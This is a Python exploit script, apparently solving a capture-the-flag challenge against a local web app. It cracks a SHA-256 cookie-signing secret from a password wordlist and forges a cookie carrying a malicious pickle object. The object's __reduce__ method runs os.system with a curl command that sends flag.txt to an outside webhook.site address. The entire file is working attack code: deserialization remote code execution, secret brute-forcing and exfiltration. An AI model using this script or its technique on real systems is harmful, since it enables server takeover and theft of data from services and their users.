
import requests
import hashlib
import base64
import pickle
import os

TARGET = 'http://127.0.0.1:5000/'
WEBHOOK_URL = 'https://webhook.site/0b0c8e00-f60a-4756-ab02-e9df48795937'
WORDLIST_PATH = './rockyou-75.txt' 

class Malicious:
    def __reduce__(self):
        #send flag to webhook
        command = f'curl {WEBHOOK_URL} --data-urlencode "flag=`cat flag.txt`"'
        return (os.system, (command,))

def serialize_data(data):
    return base64.b64encode(pickle.dumps(data)).decode()

def bruteforce_secret():
    initial_cookie = requests.get(TARGET).cookies
    signed_cookie = initial_cookie.get('signed_cookie')
    initial_data, initial_signature = signed_cookie.split('.')

    with open(WORDLIST_PATH, 'r', encoding='latin-1') as f:
        wordlist = f.read().splitlines()

    for password in wordlist:
        signature = hashlib.sha256((initial_data + password).encode()).hexdigest()
        if signature == initial_signature:
            print("Secret key found:", password)
            return password
        print("Trying:", password)
    print("No secret key in the wordlist.")
    return None

def final_malicious_cookie(secret):
    #forging cookie
    malicious_obj = Malicious()
    serialized_data = serialize_data(malicious_obj)
    signature = hashlib.sha256((serialized_data + secret).encode()).hexdigest()
    return f"{serialized_data}.{signature}"

def send_malicious_cookie(signed_cookie):
    #send payload to app
    cookies = {'signed_cookie': signed_cookie}
    response = requests.get(TARGET, cookies=cookies)
    return response.text

def main():
    secret = bruteforce_secret()
    if secret:
        signed_cookie = final_malicious_cookie(secret)
        result = send_malicious_cookie(signed_cookie)
        print("Server response:", result)

if __name__ == '__main__':
    main()